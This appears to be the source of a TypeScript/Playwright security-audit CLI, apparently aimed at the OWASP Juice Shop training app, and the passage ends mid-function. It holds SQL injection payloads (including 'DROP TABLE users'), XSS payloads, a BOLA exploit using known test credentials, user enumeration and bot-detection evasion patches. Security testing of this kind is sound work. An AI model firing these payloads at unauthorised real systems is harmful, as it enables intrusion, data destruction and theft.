import { semanticFuzzer } from './semantic-fuzzer.js';
/**
 * ═══════════════════════════════════════════════════════════════════════════════
 * QAntum - CyberCody CLI
 * ═══════════════════════════════════════════════════════════════════════════════
 * 
 * 🦾 CyberCody Security Auditor - Command Line Interface
 * 
 * Usage:
 *   npx ts-node src/security/cybercody-cli.ts ghost-audit <url> [options]
 * 
 * Commands:
 *   ghost-audit   Perform stealth security audit with evidence collection
 *   scan          Quick vulnerability scan
 *   report        Generate evidence report
 * 
 * Options:
 *   --mode <mode>        Capture mode: safe-hunter | aggressive | stealth
 *   --stealth            Enable stealth mode (randomized behavior)
 *   --multi-user         Test for BOLA/IDOR with multiple user contexts
 *   --headless           Run in headless mode (default: true)
 *   --screenshots        Enable automatic screenshot capture
 *   --gemini-key <key>   Gemini API key for AI annotations
 *   --output <dir>       Output directory for evidence
 *   --verbose            Enable verbose logging
 * 
 * @copyright 2025 Димитър Продромов (Dimitar Prodromov). All Rights Reserved.
 * @license PROPRIETARY AND CONFIDENTIAL
 * ═══════════════════════════════════════════════════════════════════════════════
 */

import { chromium, Browser, Page, BrowserContext } from 'playwright';
import * as path from 'path';
import * as fs from 'fs';
import {
  EvidenceCollector,
  createRevolutEvidenceCollector,
  SecurityEventType,
  CaptureMode,
  EvidenceCollectorConfig,
} from './evidence-collector.js';
import {
  isPlaceholder,
  isRealPII,
  analyzeAuthBypass,
  compareBOLAResponses,
  calculateEntropy,
} from './intelligence-filters.js';

// ═══════════════════════════════════════════════════════════════════════════════
// CLI TYPES
// ═══════════════════════════════════════════════════════════════════════════════

interface TargetProfile {
  name: string;
  url: string;
  mode: CaptureMode;
  isTrainingTarget: boolean;
  knownVulnerabilities?: Record<string, unknown>;
  authentication?: {
    loginEndpoint: string;
    testAccounts: Array<{ email: string; password: string; role: string }>;
  };
}

interface CLIOptions {
  command: 'ghost-audit' | 'scan' | 'report';
  url: string;
  mode: CaptureMode;
  stealth: boolean;
  multiUser: boolean;
  headless: boolean;
  screenshots: boolean;
  piiScan: boolean;
  sqlInjection: boolean;
  xssScan: boolean;
  geminiKey?: string;
  outputDir: string;
  verbose: boolean;
  targetProfile?: TargetProfile;
  authCookie?: string; // Path to cookie file or raw string
  authToken?: string;  // Path to token file or raw string
  apiFuzz?: boolean;
  authUser?: string;
  authPass?: string;
  bolaTest?: boolean;
}

interface AuditResult {
  url: string;
  startTime: Date;
  endTime: Date;
  duration: number;
  findings: SecurityFinding[];
  evidenceCount: number;
  screenshotPaths: string[];
}

interface SecurityFinding {
  id: string;
  type: SecurityEventType;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  title: string;
  description: string;
  evidence?: string;
  recommendation: string;
  cvss?: number;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CLI PARSER
// ═══════════════════════════════════════════════════════════════════════════════

function parseArgs(args: string[]): CLIOptions {
  const options: CLIOptions = {
    command: 'ghost-audit',
    url: '',
    mode: 'safe-hunter',
    stealth: false,
    multiUser: false,
    headless: true,
    screenshots: false,
    piiScan: false,
    sqlInjection: false,
    xssScan: false,
    outputDir: './evidence',
    verbose: false,
    authCookie: undefined,
    authToken: undefined,
    apiFuzz: false,
    authUser: undefined,
    authPass: undefined,
    bolaTest: false,
  };
  let i = 0;
  while (i < args.length) {
    const arg = args[i];

    switch (arg) {
      case 'ghost-audit':
      case 'scan':
      case 'report':
        options.command = arg;
        break;

      case '--mode':
        const modeArg = args[++i];
        if (modeArg === 'aggressive') {
          options.mode = 'aggressive' as CaptureMode;
        } else {
          options.mode = modeArg as CaptureMode;
        }
        break;

      case '--stealth':
        options.stealth = true;
        break;

      case '--multi-user':
        options.multiUser = true;
        break;

      case '--headless':
        options.headless = args[i + 1] !== 'false';
        if (args[i + 1] === 'false' || args[i + 1] === 'true') i++;
        break;

      case '--headless=false':
        options.headless = false;
        break;

      case '--headless=true':
        options.headless = true;
        break;

      case '--screenshots':
        options.screenshots = true;
        break;

      case '--pii-scan':
        options.piiScan = true;
        break;

      case '--sql-injection':
        options.sqlInjection = true;
        break;

      case '--xss':
        options.xssScan = true;
        break;

      case '--gemini-key':
        options.geminiKey = args[++i];
        break;

      case '--output':
        options.outputDir = args[++i];
        break;

      case '--verbose':
        options.verbose = true;
        break;

      default:
        if (arg.startsWith('http://') || arg.startsWith('https://')) {
          options.url = arg;
          // Auto-detect Juice Shop
          if (arg.includes('juice-shop')) {
            options.targetProfile = loadTargetProfile('juice-shop');
            if (options.targetProfile) {
              options.mode = options.targetProfile.mode;
              options.stealth = false;
            }
          }
        }
    }

    i++;
  }

  // In aggressive mode, enable all scans
  if (options.mode === 'aggressive' as CaptureMode) {
    options.piiScan = true;
    options.sqlInjection = true;
    options.xssScan = true;
  }

  return options;
}

/**
 * Load target profile from JSON file
 */
function loadTargetProfile(name: string): TargetProfile | undefined {
  const profilePath = path.join(__dirname, 'targets', `${name}.json`);
  try {
    if (fs.existsSync(profilePath)) {
      const content = fs.readFileSync(profilePath, 'utf-8');
      return JSON.parse(content) as TargetProfile;
    }
  } catch (err) {
    console.warn(`Could not load target profile: ${name}`);
  }
  return undefined;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CYBERCODY AUDITOR
// ═══════════════════════════════════════════════════════════════════════════════

class CyberCodyAuditor {
        /**
         * BOLA/IDOR exploit: try to access admin's basket as a normal user
         */
        private async bolaExploit(): Promise<void> {
          this.log('👥', 'Starting BOLA/IDOR exploit test...');
          const apiBase = 'https://juice-shop.herokuapp.com';
          // 1. Login as normal user
          const userEmail = 'jim@juice-sh.op';
          const userPass = 'ncc-1701';
          const adminBasketId = 1;
          // Create a new browser context for user
          const userContext = await this.browser!.newContext();
          const userPage = await userContext.newPage();
          try {
            await userPage.goto('https://juice-shop.herokuapp.com/#/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
            await userPage.waitForSelector('input#email', { timeout: 5000 });
            await userPage.fill('input#email', userEmail);
            await userPage.fill('input#password', userPass);
            await userPage.click('button[type="submit"]');
            await userPage.waitForSelector('button[aria-label="Show the shopping cart"]', { timeout: 10000 });
            this.log('✅', 'User login successful for BOLA test.');
            // Try to access admin's basket
            const cookies = await userContext.cookies();
            const cookieHeader = cookies.map(c => `${c.name}=${c.value}`).join('; ');
            const resp = await userPage.request.get(`${apiBase}/rest/basket/${adminBasketId}`, {
              headers: { 'Cookie': cookieHeader },
            });
            const body = await resp.text();
            if (/"products"\s*:\s*\[/.test(body) && !/error|unauthorized|forbidden|not allowed/i.test(body)) {
              this.log('🔴', `BOLA/IDOR: User accessed admin basket! /rest/basket/${adminBasketId}`);
              if (this.evidenceCollector) {
                await this.evidenceCollector.captureEvidence('BOLA_DETECTED', `User accessed admin basket /rest/basket/${adminBasketId}`, 'critical');
              }
            } else {
              this.log('✅', 'BOLA/IDOR: Access to admin basket denied (secure).');
            }
          } catch (err) {
            this.log('info', `BOLA test error: ${err}`);
          } finally {
            await userPage.close();
            await userContext.close();
          }
        }
      /**
       * Deep scan for SQLi on authenticated API endpoints
       */
      private async apiDeepScan(): Promise<void> {
        if (!this.page || !this.context) return;
        this.log('💉', 'Starting Semantic API Deep Scan (v25.3)...');
        const apiBase = 'https://juice-shop.herokuapp.com';
        const cookies = await this.context.cookies();
        const cookieHeader = cookies.map(c => `${c.name}=${c.value}`).join('; ');

        // 1. Test /rest/user/login with semantic fuzzing
        const loginBody = { email: 'admin@juice-sh.op', password: 'admin123' };
        const fuzzedBodies = semanticFuzzer.injectPayloadsIntoJsonBody(loginBody);
        for (const fuzzed of fuzzedBodies) {
          try {
            const start = Date.now();
            const resp = await this.page.request.post(`${apiBase}/rest/user/login`, {
              headers: { 'Content-Type': 'application/json', 'Cookie': cookieHeader },
              data: fuzzed,
            });
            const elapsed = Date.now() - start;
            const body = await resp.text();
            // Blind SQLi: look for 5s+ delay
            if (elapsed >= 4800 && elapsed <= 7000) {
              this.log('🔴', `BLIND SQLi: Detected time delay (${elapsed}ms) for payload: ${JSON.stringify(fuzzed)}`);
              if (this.evidenceCollector) {
                await this.evidenceCollector.captureEvidence('SENSITIVE_DATA_EXPOSURE', `Blind SQLi in /rest/user/login: ${JSON.stringify(fuzzed)}`, 'critical');
              }
            }
            if (/sql|syntax|error|exception|sqlite|mysql|postgres/i.test(body)) {
              this.log('🔴', `SQLi indicator in /rest/user/login with payload: ${JSON.stringify(fuzzed)}`);
              if (this.evidenceCollector) {
                await this.evidenceCollector.captureEvidence('SENSITIVE_DATA_EXPOSURE', `SQLi in /rest/user/login: ${JSON.stringify(fuzzed)}`, 'critical');
              }
            }
          } catch (err) {
            this.log('info', `API login fuzz test error: ${err}`);
          }
        }

        // 2. Test /api/Users/ endpoint (GET, try to enumerate users)
        try {
          const resp = await this.page.request.get(`${apiBase}/api/Users/`, {
            headers: { 'Cookie': cookieHeader },
          });
          const body = await resp.text();
          if (/\"email\"\s*:\s*\"[^\"]+@juice-sh.op\"/.test(body)) {
            this.log('🔴', 'User enumeration: /api/Users/ returned user emails!');
            if (this.evidenceCollector) {
              await this.evidenceCollector.captureEvidence('SENSITIVE_DATA_EXPOSURE', 'User enumeration in /api/Users/', 'critical');
            }
          }
        } catch (err) {
          this.log('info', `API /api/Users/ test error: ${err}`);
        }
      }
    /**
     * Perform login if credentials are provided via CLI
     */
    private async autoLogin(): Promise<void> {
      if (!this.options.authUser || !this.options.authPass || !this.page) return;
      this.log('🔑', `Attempting auto-login as ${this.options.authUser}...`);
      try {
        await this.page.goto('https://juice-shop.herokuapp.com/#/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
        await this.page.waitForSelector('input#email', { timeout: 5000 });
        await this.page.fill('input#email', this.options.authUser);
        await this.page.fill('input#password', this.options.authPass);
        await this.page.click('button[type="submit"]');
        // Wait for dashboard or user icon
        await this.page.waitForSelector('button[aria-label="Show the shopping cart"]', { timeout: 10000 });
        this.log('✅', 'Login successful! Session cookies set.');
      } catch (err) {
        this.log('🔴', `Auto-login failed: ${err}`);
      }
    }
  private options: CLIOptions;
  private browser: Browser | null = null;
  private context: BrowserContext | null = null;
  private page: Page | null = null;
  private evidenceCollector: EvidenceCollector | null = null;
  private findings: SecurityFinding[] = [];

  constructor(options: CLIOptions) {
    this.options = options;
  }

  async initialize(): Promise<void> {
    this.log('🦾', 'CyberCody Security Auditor v1.0.0');
    this.log('🎯', `Target: ${this.options.url}`);
    this.log('🔧', `Mode: ${this.options.mode}`);
    this.log('📸', `Screenshots: ${this.options.screenshots ? 'ENABLED' : 'DISABLED'}`);

    // Launch browser
    this.browser = await chromium.launch({
      headless: this.options.headless,
      args: this.options.stealth ? [
        '--disable-blink-features=AutomationControlled',
        '--no-sandbox',
      ] : [],
    });

    // Create context with stealth settings
    this.context = await this.browser.newContext({
      viewport: { width: 1920, height: 1080 },
      userAgent: this.options.stealth
        ? 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        : undefined,
      locale: 'bg-BG',
      timezoneId: 'Europe/Sofia',
    });

    // Create page
    this.page = await this.context.newPage();

    // Perform auto-login if credentials provided
    if (this.options.authUser && this.options.authPass) {
      await this.autoLogin();
      // After login, run API deep scan if aggressive or sql-injection enabled
      if (this.options.sqlInjection || this.options.mode === 'aggressive') {
        await this.apiDeepScan();
      }
      // Run BOLA exploit if requested
      if (this.options.bolaTest) {
        await this.bolaExploit();
      }
    }

    // Initialize evidence collector if screenshots enabled
    if (this.options.screenshots) {
      this.evidenceCollector = new EvidenceCollector({
        outputDir: this.options.outputDir,
        targetApp: this.extractAppName(this.options.url),
        mode: this.options.mode,
        imageFormat: 'webp',
        aiAnnotations: this.options.geminiKey ? 'gemini' : 'disabled',
        geminiApiKey: this.options.geminiKey,
        maskingLevel: 'strict',
        verbose: this.options.verbose,
      });

      await this.evidenceCollector.initialize(this.page);
      this.log('📸', 'Evidence Collector initialized with AI annotations');
    }

    // Stealth enhancements
    if (this.options.stealth) {
      await this.applyStealthPatches();
    }
  }

  async ghostAudit(): Promise<AuditResult> {
    const startTime = new Date();
    this.log('👻', 'Starting Ghost Audit...');

    try {
      // Navigate to target
      await this.navigate(this.options.url);

      // Run security checks
      await this.checkForIDOR();
      await this.checkForPIILeaks();
      await this.checkForAuthBypass();
      await this.checkForXSS();
      await this.checkForCSRF();
      await this.checkForClickjacking();
      await this.checkForSensitiveDataExposure();

      // Aggressive mode: SQL Injection and XSS payload testing
      if (this.options.sqlInjection || this.options.mode === 'aggressive' as CaptureMode) {
        await this.checkForSQLInjection();
      }
      if (this.options.xssScan || this.options.mode === 'aggressive' as CaptureMode) {
        await this.checkForXSSPayloads();
      }

      // Multi-user testing
      if (this.options.multiUser) {
        await this.performMultiUserTest();
      }

      const endTime = new Date();

      // Generate report
      const result: AuditResult = {
        url: this.options.url,
        startTime,
        endTime,
        duration: endTime.getTime() - startTime.getTime(),
        findings: this.findings,
        evidenceCount: this.evidenceCollector?.getStats().totalCaptures ?? 0,
        screenshotPaths: [],
      };

      // Export evidence report
      if (this.evidenceCollector) {
        const reportPath = await this.evidenceCollector.exportReport();
        this.log('📊', `Evidence report: ${reportPath}`);
      }

      return result;

    } finally {
      await this.cleanup();
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // SECURITY CHECKS
  // ═══════════════════════════════════════════════════════════════════════════

  private async checkForIDOR(): Promise<void> {
    if (!this.page) return;
    this.log('🔍', 'Checking for IDOR vulnerabilities...');

    // Monitor API calls for ID patterns
    const idorPatterns = [
      /\/api\/v\d+\/users\/(\d+)/,
      /\/api\/v\d+\/accounts\/(\d+)/,
      /\/api\/v\d+\/transactions\/(\d+)/,
      /user_id=(\d+)/,
      /account_id=(\d+)/,
    ];

    const interceptedUrls: string[] = [];

    this.page.on('request', request => {
      const url = request.url();
      for (const pattern of idorPatterns) {
        if (pattern.test(url)) {
          interceptedUrls.push(url);
        }
      }
    });

    // Wait for page to load completely
    await this.page.waitForLoadState('networkidle').catch(() => {});

    if (interceptedUrls.length > 0) {
      const finding: SecurityFinding = {
        id: `IDOR-${Date.now()}`,
        type: 'IDOR_CANDIDATE',
        severity: 'high',
        title: 'Potential IDOR Vulnerability Detected',
        description: `Found ${interceptedUrls.length} API endpoints with direct object references`,
        recommendation: 'Implement indirect reference maps and verify authorization for each request',
        cvss: 7.5,
      };

      this.findings.push(finding);

      if (this.evidenceCollector) {
        await this.evidenceCollector.captureEvidence(
          'IDOR_CANDIDATE',
          `IDOR candidates: ${interceptedUrls.join(', ')}`,
          'high'
        );
      }
    }
  }

  private async checkForPIILeaks(): Promise<void> {
    if (!this.page) return;
    this.log('🔍', 'Checking for PII leaks (with intelligence filters)...');

    const piiPatterns = {
      email: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
      phone: /(?:\+359|0)[\s-]?\d{2,3}[\s-]?\d{3}[\s-]?\d{3,4}/g,
      creditCard: /\b(?:\d{4}[-\s]?){3}\d{4}\b/g,
      ssn: /\b\d{3}[-\s]?\d{2}[-\s]?\d{4}\b/g,
    };

    // Check page content
    const content = await this.page.content();
    const realLeaks: string[] = [];

    for (const [type, pattern] of Object.entries(piiPatterns)) {
      const matches = content.match(pattern);
      if (matches && matches.length > 0) {
        // Filter out placeholders using intelligence filters
        const realMatches = matches.filter(match => {
          const piiType = type === 'email' ? 'email' : type === 'phone' ? 'phone' : 'generic';
          return isRealPII(match, piiType);
        });
        
        if (realMatches.length > 0) {
          realLeaks.push(`${type}: ${realMatches.length} REAL instances (filtered ${matches.length - realMatches.length} placeholders)`);
          this.log('⚠️', `Found REAL ${type}: ${realMatches.slice(0, 3).join(', ')}${realMatches.length > 3 ? '...' : ''}`);
        } else {
          this.log('info', `Filtered ${matches.length} ${type} placeholders`);
        }
      }
    }

    if (realLeaks.length > 0) {
      const finding: SecurityFinding = {
        id: `PII-${Date.now()}`,
        type: 'PII_LEAK',
        severity: 'critical',
        title: 'REAL PII Exposure Detected',
        description: `Found exposed personally identifiable information: ${realLeaks.join(', ')}`,
        recommendation: 'Mask or remove PII from DOM and API responses',
        cvss: 8.0,
      };

      this.findings.push(finding);

      if (this.evidenceCollector) {
        await this.evidenceCollector.captureEvidence(
          'PII_LEAK',
          `REAL PII leaks detected: ${realLeaks.join(', ')}`,
          'critical'
        );
      }
    }
  }

  private async checkForAuthBypass(): Promise<void> {
    if (!this.page) return;
    this.log('🔍', 'Checking for authentication bypass...');

    // Check for accessible authenticated routes
    const protectedRoutes = [
      '/dashboard',
      '/account',
      '/settings',
      '/profile',
      '/admin',
      '/api/me',
    ];

    const bypassIndicators: string[] = [];

    for (const route of protectedRoutes) {
      try {
        const findings: SecurityFinding[] = [];
        const response = await this.page.goto(route, { 
          waitUntil: 'domcontentloaded',
          timeout: 5000 
        });

        if (response && response.status() === 200) {
          // Check if we got actual content vs redirect
          const currentUrl = this.page.url();
          if (!currentUrl.includes('login') && !currentUrl.includes('auth')) {
            bypassIndicators.push(route);
          }
        }
      } catch {
        // Route not accessible
      }
    }

    // Return to original URL
    await this.page.goto(this.options.url).catch(() => {});


    if (bypassIndicators.length > 0) {
      this.log('🔴', `Potential Auth Bypass: ${bypassIndicators.join(', ')}`);
      const finding: SecurityFinding = {
        id: `AUTH-${Date.now()}`,
        type: 'AUTH_BYPASS',
        severity: 'critical',
        title: 'Potential Authentication Bypass',
        description: `The following protected routes may be accessible without authentication: ${bypassIndicators.join(', ')}`,
        recommendation: 'Implement proper authentication checks on all protected routes',
        cvss: 9.0,
      };
      this.findings.push(finding);
    }
  }

  private async checkForXSS(): Promise<void> {
    if (!this.page) return;
    this.log('🔍', 'Checking for XSS vulnerabilities...');

    // Look for reflected content in URL parameters
    const url = new URL(this.page.url());
    const params = url.searchParams;
    const xssPayloads = ['<script>', 'javascript:', 'onerror=', 'onload='];

    for (const [key, value] of params.entries()) {
      for (const payload of xssPayloads) {
        if (value.includes(payload)) {
          const finding: SecurityFinding = {
            id: `XSS-${Date.now()}`,
            type: 'XSS_REFLECTION',
            severity: 'high',
            title: 'Potential XSS Reflection',
            description: `Parameter "${key}" may be vulnerable to XSS`,
            recommendation: 'Implement proper input sanitization and output encoding',
            cvss: 7.0,
          };

          this.findings.push(finding);

          if (this.evidenceCollector) {
            await this.evidenceCollector.captureEvidence(
              'XSS_REFLECTION',
              `XSS candidate in parameter: ${key}`,
              'high'
            );
          }
          break;
        }
      }
    }
  }

  private async checkForCSRF(): Promise<void> {
    if (!this.page) return;
    this.log('🔍', 'Checking for CSRF protection...');

    // Check for CSRF tokens in forms
    const forms = await this.page.$$('form');
    const formsWithoutCSRF: string[] = [];

    for (const form of forms) {
      const method = await form.getAttribute('method');
      if (method?.toLowerCase() === 'post') {
        const csrfInput = await form.$('input[name*="csrf"], input[name*="token"], input[name*="_token"]');
        if (!csrfInput) {
          const action = await form.getAttribute('action') ?? 'unknown';
          formsWithoutCSRF.push(action);
        }
      }
    }

    if (formsWithoutCSRF.length > 0) {
      const finding: SecurityFinding = {
        id: `CSRF-${Date.now()}`,
        type: 'CSRF_TOKEN_MISSING',
        severity: 'medium',
        title: 'Missing CSRF Protection',
        description: `${formsWithoutCSRF.length} forms found without CSRF tokens`,
        recommendation: 'Implement CSRF tokens for all state-changing operations',
        cvss: 6.0,
      };

      this.findings.push(finding);

      if (this.evidenceCollector) {
        await this.evidenceCollector.captureEvidence(
          'CSRF_TOKEN_MISSING',
          `Forms without CSRF: ${formsWithoutCSRF.length}`,
          'medium'
        );
      }
    }
  }

  private async checkForClickjacking(): Promise<void> {
    if (!this.page) return;
    this.log('🔍', 'Checking for clickjacking protection...');

    // Check response headers
    const response = await this.page.goto(this.options.url);
    if (!response) return;

    const headers = response.headers();
    const hasXFrameOptions = !!headers['x-frame-options'];
    const hasCSP = headers['content-security-policy']?.includes('frame-ancestors');

    if (!hasXFrameOptions && !hasCSP) {
      const finding: SecurityFinding = {
        id: `CLICK-${Date.now()}`,
        type: 'CLICKJACKING_RISK',
        severity: 'medium',
        title: 'Clickjacking Protection Missing',
        description: 'No X-Frame-Options or CSP frame-ancestors header detected',
        recommendation: 'Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors \'none\'',
        cvss: 5.0,
      };

      this.findings.push(finding);

      if (this.evidenceCollector) {
        await this.evidenceCollector.captureEvidence(
          'CLICKJACKING_RISK',
          'Missing clickjacking protection headers',
          'medium'
        );
      }
    }
  }

  private async checkForSensitiveDataExposure(): Promise<void> {
    if (!this.page) return;
    this.log('🔍', 'Checking for sensitive data exposure...');

    // Check for exposed API keys, tokens, etc.
    const content = await this.page.content();
    const sensitivePatterns = [
      /api[_-]?key['":\s]+['"]?([a-zA-Z0-9_-]{20,})['"]?/gi,
      /bearer\s+([a-zA-Z0-9._-]{20,})/gi,
      /private[_-]?key/gi,
      /secret[_-]?key/gi,
    ];

    const exposures: string[] = [];

    for (const pattern of sensitivePatterns) {
      if (pattern.test(content)) {
        exposures.push(pattern.source.substring(0, 20));
        pattern.lastIndex = 0; // Reset regex
      }
    }

    if (exposures.length > 0) {
      const finding: SecurityFinding = {
        id: `EXPOSE-${Date.now()}`,
        type: 'SENSITIVE_DATA_EXPOSURE',
        severity: 'high',
        title: 'Sensitive Data Exposure',
        description: `Found potentially exposed sensitive data patterns in page content`,
        recommendation: 'Remove sensitive data from client-side code and DOM',
        cvss: 7.5,
      };

      this.findings.push(finding);

      if (this.evidenceCollector) {
        await this.evidenceCollector.captureEvidence(
          'SENSITIVE_DATA_EXPOSURE',
          `Sensitive patterns found: ${exposures.length}`,
          'high'
        );
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // AGGRESSIVE MODE: SQL INJECTION TESTING
  // ═══════════════════════════════════════════════════════════════════════════

  private async checkForSQLInjection(): Promise<void> {
    if (!this.page) return;
    this.log('💉', 'Testing for SQL Injection vulnerabilities...');

    const sqlPayloads = [
      "' OR '1'='1",
      "' OR 1=1--",
      "admin'--",
      "1' OR '1'='1",
      "' UNION SELECT NULL--",
      "1; DROP TABLE users--",
      "' AND '1'='1",
      "1' AND SLEEP(5)--",
    ];

    // Find input fields
    const inputs = await this.page.$$('input[type="text"], input[type="search"], input[type="email"], input:not([type])');
    const searchParams = new URL(this.page.url()).searchParams;
    
    let vulnerableFound = false;

    // Test URL parameters
    for (const [param, value] of searchParams.entries()) {
      for (const payload of sqlPayloads.slice(0, 3)) {
        const testUrl = new URL(this.page.url());
        testUrl.searchParams.set(param, payload);
        
        try {
          const response = await this.page.goto(testUrl.toString(), { timeout: 10000 });
          const content = await this.page.content();
          
          // Check for SQL error indicators
          const sqlErrors = [
            /sql syntax/i,
            /mysql_/i,
            /sqlite_/i,
            /postgresql/i,
            /ORA-\d{5}/i,
            /Microsoft SQL Server/i,
            /unclosed quotation mark/i,
            /syntax error/i,
          ];
          
          for (const errorPattern of sqlErrors) {
            if (errorPattern.test(content)) {
              vulnerableFound = true;
              this.log('🔴', `SQL Injection FOUND in param: ${param}`);
              
              const finding: SecurityFinding = {
                id: `SQLI-${Date.now()}`,
                type: 'SENSITIVE_DATA_EXPOSURE',
                severity: 'critical',
                title: 'SQL Injection Vulnerability',
                description: `Parameter "${param}" is vulnerable to SQL injection. Payload: ${payload}`,
                recommendation: 'Use parameterized queries or prepared statements',
                cvss: 9.8,
              };
              this.findings.push(finding);

              if (this.evidenceCollector) {
                await this.evidenceCollector.captureEvidence(
                  'SENSITIVE_DATA_EXPOSURE',
                  `SQL Injection in ${param}: ${payload}`,
                  'critical'
                );
              }
              break;
            }
          }
        } catch {
          // Timeout or error might also indicate SQL injection
        }
      }
    }

    // Test input fields on current page
    for (const input of inputs.slice(0, 5)) {
      const inputName = await input.getAttribute('name') || await input.getAttribute('id') || 'unknown';
      
      for (const payload of sqlPayloads.slice(0, 2)) {
        try {
          await input.fill(payload);
          
          // Try to submit (press Enter or find submit button)
          const form = await input.evaluateHandle(el => el.closest('form'));
          if (form) {
            await input.press('Enter');
            await this.page.waitForLoadState('networkidle').catch(() => {});
            
            const content = await this.page.content();
            if (/sql|error|exception/i.test(content)) {
              this.log('🔴', `SQL Injection possible in field: ${inputName}`);
              vulnerableFound = true;
              
              if (this.evidenceCollector) {
                await this.evidenceCollector.captureEvidence(
                  'SENSITIVE_DATA_EXPOSURE',
                  `SQL Injection test on field: ${inputName}`,
                  'high'
                );
              }
            }
          }
          
          await input.fill(''); // Clear
        } catch {
          // Field might not be fillable
        }
      }
    }

    if (!vulnerableFound) {
      this.log('✅', 'No SQL Injection vulnerabilities found');
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // AGGRESSIVE MODE: XSS PAYLOAD TESTING
  // ═══════════════════════════════════════════════════════════════════════════

  private async checkForXSSPayloads(): Promise<void> {
    if (!this.page) return;
    this.log('🎯', 'Testing for XSS vulnerabilities with payloads...');

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      "'-alert('XSS')-'",
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
    ];

    let xssFound = false;

    // Set up dialog handler to detect alert() execution
    this.page.on('dialog', async dialog => {
      if (dialog.message().includes('XSS')) {
        xssFound = true;
        this.log('🔴', `XSS CONFIRMED! Alert triggered: ${dialog.message()}`);
        await dialog.dismiss();
      } else {
        await dialog.dismiss();
      }
    });

    // Test URL parameters
    const url = new URL(this.page.url());
    for (const [param, value] of url.searchParams.entries()) {
      for (const payload of xssPayloads.slice(0, 3)) {
        const testUrl = new URL(this.page.url());
        testUrl.searchParams.set(param, payload);
        
        try {
          await this.page.goto(testUrl.toString(), { timeout: 10000 });
          await this.page.waitForTimeout(1000); // Wait for scripts to execute
          
          // Check if payload is reflected in DOM without encoding
          const content = await this.page.content();
          if (content.includes(payload) || content.includes(payload.replace(/"/g, "'"))) {
            this.log('⚠️', `XSS payload reflected in param: ${param}`);
            
            const finding: SecurityFinding = {
              id: `XSS-${Date.now()}`,
              type: 'XSS_REFLECTION',
              severity: 'high',
              title: 'Reflected XSS Vulnerability',
              description: `Parameter "${param}" reflects user input without proper encoding. Payload: ${payload}`,
              recommendation: 'Implement proper output encoding and Content-Security-Policy',
              cvss: 7.1,
            };
            this.findings.push(finding);

            if (this.evidenceCollector) {
              await this.evidenceCollector.captureEvidence(
                'XSS_REFLECTION',
                `XSS reflected in ${param}`,
                'high'
              );
            }
          }
        } catch {
          // Error handling
        }
      }
    }

    // Test search/input fields
    const searchInputs = await this.page.$$('input[type="search"], input[name*="search"], input[name*="q"], input[id*="search"]');
    
    for (const input of searchInputs.slice(0, 3)) {
      for (const payload of xssPayloads.slice(0, 2)) {
        try {
          await input.fill(payload);
          await input.press('Enter');
          await this.page.waitForTimeout(1500);
          
          const content = await this.page.content();
          if (content.includes('<script>alert') || content.includes('onerror=alert')) {
            this.log('🔴', 'XSS payload executed in search field!');
            xssFound = true;
            
            if (this.evidenceCollector) {
              await this.evidenceCollector.captureEvidence(
                'XSS_REFLECTION',
                'XSS in search field',
                'critical'
              );
            }
          }
          
          await input.fill('');
        } catch {
          // Field might not exist anymore
        }
      }
    }

    if (xssFound) {
      this.log('🔴', 'XSS vulnerabilities CONFIRMED!');
    } else {
      this.log('✅', 'No executable XSS found (payloads may be encoded)');
    }
  }

  private async performMultiUserTest(): Promise<void> {
    this.log('👥', 'Performing multi-user BOLA test...');

    // Check for target profile with test accounts
    if (this.options.targetProfile?.authentication?.testAccounts) {
      const accounts = this.options.targetProfile.authentication.testAccounts;
      this.log('🔑', `Found ${accounts.length} test accounts in profile`);
      
      // TODO: Implement actual BOLA testing with these accounts
      for (const account of accounts) {
        this.log('info', `  - ${account.email} (${account.role})`);
      }
    }

    this.log('info', 'Multi-user BOLA testing requires authentication tokens');
    this.log('info', 'Configure user sessions in environment variables:');
    this.log('info', '  CYBERCODY_USER_A_TOKEN=...');
    this.log('info', '  CYBERCODY_USER_B_TOKEN=...');

    if (this.evidenceCollector) {
      await this.evidenceCollector.captureEvidence(
        'BOLA_DETECTED',
        'Multi-user test initiated - requires authentication setup',
        'info'
      );
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // UTILITY METHODS
  // ═══════════════════════════════════════════════════════════════════════════

  private async navigate(url: string): Promise<void> {
    if (!this.page) return;

    this.log('🌐', `Navigating to ${url}...`);
    
    await this.page.goto(url, {
      waitUntil: 'domcontentloaded',
      timeout: 30000,
    });

    // Add random delay for stealth
    if (this.options.stealth) {
      await this.randomDelay(500, 2000);
    }

    // Capture initial state
    if (this.evidenceCollector) {
      await this.evidenceCollector.captureEvidence(
        'URL_CHANGE',
        `Initial navigation to ${url}`,
        'info'
      );
    }
  }

  private async applyStealthPatches(): Promise<void> {
    if (!this.page) return;

    // Hide webdriver flag
    await this.page.addInitScript(() => {
      Object.defineProperty(navigator, 'webdriver', {
        get: () => undefined,
      });
    });

    // Random mouse movements
    await this.page.addInitScript(() => {
      // Add some random mouse movement simulation
      (window as unknown as { __stealthMode: boolean }).__stealthMode = true;
    });

    this.log('🥷', 'Stealth patches applied');
  }

  private async randomDelay(min: number, max: number): Promise<void> {
    const delay = Math.floor(Math.random() * (max - min + 1) + min);
    await new Promise(resolve => setTimeout(resolve, delay));
  }

  private extractAppName(url: string): string {
    try {
      const hostname = new URL(url).hostname;
      return hostname.replace(/^(www\.|app\.)/, '').split('.')[0];
    } catch {
      return 'unknown';
    }
  }

  private async cleanup(): Promise<void> {
    if (this.context) await this.context.close();
    if (this.browser) await this.browser.close();
    this.log('🧹', 'Cleanup complete');
  }

  private log(emoji: string, message: string): void {
    if (this.options.verbose || !emoji.includes('info')) {
